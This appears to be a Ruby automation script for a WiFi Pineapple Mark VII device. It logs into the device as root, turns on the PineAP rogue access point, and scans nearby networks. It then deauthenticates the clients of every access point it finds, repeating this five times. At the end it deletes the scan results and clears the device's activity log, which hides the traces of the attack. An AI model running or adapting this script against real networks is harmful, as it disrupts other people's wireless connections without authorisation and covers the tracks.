require_relative('../../classes/PineappleMK7.rb')

system_authentication = PineappleMK7::System::Authentication.new
system_authentication.host = "172.16.42.1"
system_authentication.port = 1471
system_authentication.mac = "00:13:37:DD:EE:FF"
system_authentication.password = "<ROOT-ACCOUNT-PASSWORD>"

if (system_authentication.login)

    led = PineappleMK7::System::LED.new

    SCAN_TIME = 120
    
    5.times do

        # SETUP
        #
        led.setup

        pineap_settings = PineappleMK7::Modules::PineAP::Settings.new
        pineap_settings.enablePineAP = true
        pineap_settings.save

        recon_scanning = PineappleMK7::Modules::Recon::Scanning.new

        logging_activity = PineappleMK7::Modules::Logging::Activity.new

        # ATTACK 1
        #
        led.attack

        scanID = (recon_scanning.start(SCAN_TIME)).scanID
        output = recon_scanning.output(scanID)

        # SPECIAL
        #
        led.special

        ap_clients = []
        output.APResults.each do |ap|
            if (ap.clients.nil? === false)
                ap_clients << ap
            end
        end

        # ATTACK 2
        #
        led.attack

        puts('[+] Clients deauthenticated')

        if (ap_clients.size > 0)

            ap_clients.each do |ap|
                recon_scanning.deauth_ap(ap)
                pp(ap)
                sleep(10)
            end

        end

        # FINISH
        #
        led.finish

        pineap_settings.enablePineAP = false
        pineap_settings.save

        # CLEANUP
        #
        led.cleanup

        recon_scanning.delete(scanID)
        logging_activity.clear

        # OFF
        #
        led.off

    end

end